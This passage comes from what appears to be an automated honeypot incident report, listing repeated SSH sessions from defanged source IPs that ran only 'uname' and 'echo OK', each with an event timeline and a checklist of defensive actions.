| `2026-07-13 06:33:59` | `cowrie.session.connect` |
| `2026-07-13 06:33:59` | `cowrie.client.version` |
| `2026-07-13 06:33:59` | `cowrie.client.kex` |
| `2026-07-13 06:34:01` | `cowrie.login.success` |
| `2026-07-13 06:34:01` | `cowrie.direct-tcpip.request` |
| `2026-07-13 06:34:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.53.7[.]231` to AbuseIPDB if not already reported
- [ ] Block `64.53.7[.]231` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f202471932c5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:35 |
| **Last Seen** | 2026-07-13 06:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:35:11` | `cowrie.session.connect` |
| `2026-07-13 06:35:11` | `cowrie.client.version` |
| `2026-07-13 06:35:11` | `cowrie.client.kex` |
| `2026-07-13 06:35:14` | `cowrie.login.success` |
| `2026-07-13 06:35:15` | `cowrie.session.params` |
| `2026-07-13 06:35:15` | `cowrie.command.input` |
| `2026-07-13 06:35:15` | `cowrie.log.closed` |
| `2026-07-13 06:35:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39623e5fac89

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:35 |
| **Last Seen** | 2026-07-13 06:35 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:35:20` | `cowrie.session.connect` |
| `2026-07-13 06:35:21` | `cowrie.client.version` |
| `2026-07-13 06:35:21` | `cowrie.client.kex` |
| `2026-07-13 06:35:26` | `cowrie.login.success` |
| `2026-07-13 06:35:27` | `cowrie.session.params` |
| `2026-07-13 06:35:27` | `cowrie.command.input` |
| `2026-07-13 06:35:28` | `cowrie.log.closed` |
| `2026-07-13 06:35:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-955d6199e3ae

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:35 |
| **Last Seen** | 2026-07-13 06:35 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:35:30` | `cowrie.session.connect` |
| `2026-07-13 06:35:30` | `cowrie.client.version` |
| `2026-07-13 06:35:30` | `cowrie.client.kex` |
| `2026-07-13 06:35:32` | `cowrie.login.success` |
| `2026-07-13 06:35:34` | `cowrie.session.params` |
| `2026-07-13 06:35:34` | `cowrie.command.input` |
| `2026-07-13 06:35:35` | `cowrie.log.closed` |
| `2026-07-13 06:35:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b56b0522f43d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:35 |
| **Last Seen** | 2026-07-13 06:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:35:39` | `cowrie.session.connect` |
| `2026-07-13 06:35:39` | `cowrie.client.version` |
| `2026-07-13 06:35:39` | `cowrie.client.kex` |
| `2026-07-13 06:35:41` | `cowrie.login.success` |
| `2026-07-13 06:35:42` | `cowrie.session.params` |
| `2026-07-13 06:35:42` | `cowrie.command.input` |
| `2026-07-13 06:35:43` | `cowrie.log.closed` |
| `2026-07-13 06:35:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5c1a3dc7501

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:35 |
| **Last Seen** | 2026-07-13 06:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:35:48` | `cowrie.session.connect` |
| `2026-07-13 06:35:49` | `cowrie.client.version` |
| `2026-07-13 06:35:49` | `cowrie.client.kex` |
| `2026-07-13 06:35:50` | `cowrie.login.success` |
| `2026-07-13 06:35:51` | `cowrie.session.params` |
| `2026-07-13 06:35:51` | `cowrie.command.input` |
| `2026-07-13 06:35:51` | `cowrie.log.closed` |
| `2026-07-13 06:35:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f5fca26b80f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:35 |
| **Last Seen** | 2026-07-13 06:36 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:35:57` | `cowrie.session.connect` |
| `2026-07-13 06:35:58` | `cowrie.client.version` |
| `2026-07-13 06:35:58` | `cowrie.client.kex` |
| `2026-07-13 06:36:00` | `cowrie.login.success` |
| `2026-07-13 06:36:01` | `cowrie.session.params` |
| `2026-07-13 06:36:01` | `cowrie.command.input` |
| `2026-07-13 06:36:01` | `cowrie.log.closed` |
| `2026-07-13 06:36:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5218d94ecba4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:36 |
| **Last Seen** | 2026-07-13 06:36 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:36:06` | `cowrie.session.connect` |
| `2026-07-13 06:36:06` | `cowrie.client.version` |
| `2026-07-13 06:36:06` | `cowrie.client.kex` |
| `2026-07-13 06:36:09` | `cowrie.login.success` |
| `2026-07-13 06:36:10` | `cowrie.session.params` |
| `2026-07-13 06:36:10` | `cowrie.command.input` |
| `2026-07-13 06:36:11` | `cowrie.log.closed` |
| `2026-07-13 06:36:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a09f63a00e60

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:36 |
| **Last Seen** | 2026-07-13 06:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:36:15` | `cowrie.session.connect` |
| `2026-07-13 06:36:15` | `cowrie.client.version` |
| `2026-07-13 06:36:15` | `cowrie.client.kex` |
| `2026-07-13 06:36:16` | `cowrie.login.success` |
| `2026-07-13 06:36:17` | `cowrie.session.params` |
| `2026-07-13 06:36:17` | `cowrie.command.input` |
| `2026-07-13 06:36:18` | `cowrie.log.closed` |
| `2026-07-13 06:36:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d861de79cf77

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:36 |
| **Last Seen** | 2026-07-13 06:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:36:24` | `cowrie.session.connect` |
| `2026-07-13 06:36:24` | `cowrie.client.version` |
| `2026-07-13 06:36:24` | `cowrie.client.kex` |
| `2026-07-13 06:36:25` | `cowrie.login.success` |
| `2026-07-13 06:36:27` | `cowrie.session.params` |
| `2026-07-13 06:36:27` | `cowrie.command.input` |
| `2026-07-13 06:36:27` | `cowrie.log.closed` |
| `2026-07-13 06:36:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83b72d9b8df4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:36 |
| **Last Seen** | 2026-07-13 06:36 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:36:32` | `cowrie.session.connect` |
| `2026-07-13 06:36:32` | `cowrie.client.version` |
| `2026-07-13 06:36:32` | `cowrie.client.kex` |
| `2026-07-13 06:36:35` | `cowrie.login.success` |
| `2026-07-13 06:36:36` | `cowrie.session.params` |
| `2026-07-13 06:36:36` | `cowrie.command.input` |
| `2026-07-13 06:36:36` | `cowrie.log.closed` |
| `2026-07-13 06:36:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7352bf65203

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:36 |
| **Last Seen** | 2026-07-13 06:36 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:36:40` | `cowrie.session.connect` |
| `2026-07-13 06:36:41` | `cowrie.client.version` |
| `2026-07-13 06:36:41` | `cowrie.client.kex` |
| `2026-07-13 06:36:44` | `cowrie.login.success` |
| `2026-07-13 06:36:45` | `cowrie.session.params` |
| `2026-07-13 06:36:45` | `cowrie.command.input` |
| `2026-07-13 06:36:45` | `cowrie.log.closed` |
| `2026-07-13 06:36:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4c98b0a05a6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:36 |
| **Last Seen** | 2026-07-13 06:36 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:36:49` | `cowrie.session.connect` |
| `2026-07-13 06:36:50` | `cowrie.client.version` |
| `2026-07-13 06:36:50` | `cowrie.client.kex` |
| `2026-07-13 06:36:53` | `cowrie.login.success` |
| `2026-07-13 06:36:55` | `cowrie.session.params` |
| `2026-07-13 06:36:55` | `cowrie.command.input` |
| `2026-07-13 06:36:56` | `cowrie.log.closed` |
| `2026-07-13 06:36:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90159227e3ca

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:36 |
| **Last Seen** | 2026-07-13 06:37 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:36:57` | `cowrie.session.connect` |
| `2026-07-13 06:36:58` | `cowrie.client.version` |
| `2026-07-13 06:36:58` | `cowrie.client.kex` |
| `2026-07-13 06:37:00` | `cowrie.login.success` |
| `2026-07-13 06:37:02` | `cowrie.session.params` |
| `2026-07-13 06:37:02` | `cowrie.command.input` |
| `2026-07-13 06:37:02` | `cowrie.log.closed` |
| `2026-07-13 06:37:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-853e45b43eeb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:37 |
| **Last Seen** | 2026-07-13 06:37 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:37:06` | `cowrie.session.connect` |
| `2026-07-13 06:37:07` | `cowrie.client.version` |
| `2026-07-13 06:37:07` | `cowrie.client.kex` |
| `2026-07-13 06:37:09` | `cowrie.login.success` |
| `2026-07-13 06:37:10` | `cowrie.session.params` |
| `2026-07-13 06:37:10` | `cowrie.command.input` |
| `2026-07-13 06:37:10` | `cowrie.log.closed` |
| `2026-07-13 06:37:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86ca3ade7509

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-13 06:37 |
| **Last Seen** | 2026-07-13 06:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:37:13` | `cowrie.session.connect` |
| `2026-07-13 06:37:13` | `cowrie.client.version` |
| `2026-07-13 06:37:13` | `cowrie.client.kex` |
| `2026-07-13 06:37:13` | `cowrie.login.success` |
| `2026-07-13 06:37:14` | `cowrie.session.params` |
| `2026-07-13 06:37:14` | `cowrie.command.input` |
| `2026-07-13 06:37:15` | `cowrie.log.closed` |
| `2026-07-13 06:37:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cea995eefb16

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:37 |
| **Last Seen** | 2026-07-13 06:37 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:37:15` | `cowrie.session.connect` |
| `2026-07-13 06:37:15` | `cowrie.client.version` |
| `2026-07-13 06:37:15` | `cowrie.client.kex` |
| `2026-07-13 06:37:18` | `cowrie.login.success` |
| `2026-07-13 06:37:19` | `cowrie.session.params` |
| `2026-07-13 06:37:19` | `cowrie.command.input` |
| `2026-07-13 06:37:19` | `cowrie.log.closed` |
| `2026-07-13 06:37:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-198f14a5eaf3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:37 |
| **Last Seen** | 2026-07-13 06:37 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:37:24` | `cowrie.session.connect` |
| `2026-07-13 06:37:24` | `cowrie.client.version` |
| `2026-07-13 06:37:24` | `cowrie.client.kex` |
| `2026-07-13 06:37:26` | `cowrie.login.success` |
| `2026-07-13 06:37:28` | `cowrie.session.params` |
| `2026-07-13 06:37:28` | `cowrie.command.input` |
| `2026-07-13 06:37:28` | `cowrie.log.closed` |
| `2026-07-13 06:37:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c876a06a7efa

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:37 |
| **Last Seen** | 2026-07-13 06:37 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:37:32` | `cowrie.session.connect` |
| `2026-07-13 06:37:33` | `cowrie.client.version` |
| `2026-07-13 06:37:33` | `cowrie.client.kex` |
| `2026-07-13 06:37:35` | `cowrie.login.success` |
| `2026-07-13 06:37:36` | `cowrie.session.params` |
| `2026-07-13 06:37:36` | `cowrie.command.input` |
| `2026-07-13 06:37:36` | `cowrie.log.closed` |
| `2026-07-13 06:37:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d04e16c72ce

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:37 |
| **Last Seen** | 2026-07-13 06:37 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:37:41` | `cowrie.session.connect` |
| `2026-07-13 06:37:41` | `cowrie.client.version` |
| `2026-07-13 06:37:41` | `cowrie.client.kex` |
| `2026-07-13 06:37:44` | `cowrie.login.success` |
| `2026-07-13 06:37:46` | `cowrie.session.params` |
| `2026-07-13 06:37:46` | `cowrie.command.input` |
| `2026-07-13 06:37:47` | `cowrie.log.closed` |
| `2026-07-13 06:37:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a5fad635855

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:37 |
| **Last Seen** | 2026-07-13 06:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:37:51` | `cowrie.session.connect` |
| `2026-07-13 06:37:51` | `cowrie.client.version` |
| `2026-07-13 06:37:51` | `cowrie.client.kex` |
| `2026-07-13 06:37:52` | `cowrie.login.success` |
| `2026-07-13 06:37:53` | `cowrie.session.params` |
| `2026-07-13 06:37:53` | `cowrie.command.input` |
| `2026-07-13 06:37:53` | `cowrie.log.closed` |
| `2026-07-13 06:37:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74464e19002d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:37 |
| **Last Seen** | 2026-07-13 06:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:37:58` | `cowrie.session.connect` |
| `2026-07-13 06:37:59` | `cowrie.client.version` |
| `2026-07-13 06:37:59` | `cowrie.client.kex` |
| `2026-07-13 06:38:00` | `cowrie.login.success` |
| `2026-07-13 06:38:01` | `cowrie.session.params` |
| `2026-07-13 06:38:01` | `cowrie.command.input` |
| `2026-07-13 06:38:01` | `cowrie.log.closed` |
| `2026-07-13 06:38:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da85d03ea822

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:38 |
| **Last Seen** | 2026-07-13 06:38 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:38:07` | `cowrie.session.connect` |
| `2026-07-13 06:38:08` | `cowrie.client.version` |
| `2026-07-13 06:38:08` | `cowrie.client.kex` |
| `2026-07-13 06:38:10` | `cowrie.login.success` |
| `2026-07-13 06:38:12` | `cowrie.session.params` |
| `2026-07-13 06:38:12` | `cowrie.command.input` |
| `2026-07-13 06:38:12` | `cowrie.log.closed` |
| `2026-07-13 06:38:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b9ea4989e64

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:38 |
| **Last Seen** | 2026-07-13 06:38 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:38:15` | `cowrie.session.connect` |
| `2026-07-13 06:38:16` | `cowrie.client.version` |
| `2026-07-13 06:38:16` | `cowrie.client.kex` |
| `2026-07-13 06:38:18` | `cowrie.login.success` |
| `2026-07-13 06:38:20` | `cowrie.session.params` |
| `2026-07-13 06:38:20` | `cowrie.command.input` |
| `2026-07-13 06:38:20` | `cowrie.log.closed` |
| `2026-07-13 06:38:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85d18031c8b2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:38 |
| **Last Seen** | 2026-07-13 06:38 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:38:23` | `cowrie.session.connect` |
| `2026-07-13 06:38:24` | `cowrie.client.version` |
| `2026-07-13 06:38:24` | `cowrie.client.kex` |
| `2026-07-13 06:38:28` | `cowrie.login.success` |
| `2026-07-13 06:38:30` | `cowrie.session.params` |
| `2026-07-13 06:38:30` | `cowrie.command.input` |
| `2026-07-13 06:38:31` | `cowrie.log.closed` |
| `2026-07-13 06:38:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86605b0d2922

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:38 |
| **Last Seen** | 2026-07-13 06:38 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:38:32` | `cowrie.session.connect` |
| `2026-07-13 06:38:33` | `cowrie.client.version` |
| `2026-07-13 06:38:33` | `cowrie.client.kex` |
| `2026-07-13 06:38:35` | `cowrie.login.success` |
| `2026-07-13 06:38:37` | `cowrie.session.params` |
| `2026-07-13 06:38:37` | `cowrie.command.input` |
| `2026-07-13 06:38:38` | `cowrie.log.closed` |
| `2026-07-13 06:38:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06170b92d7f0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
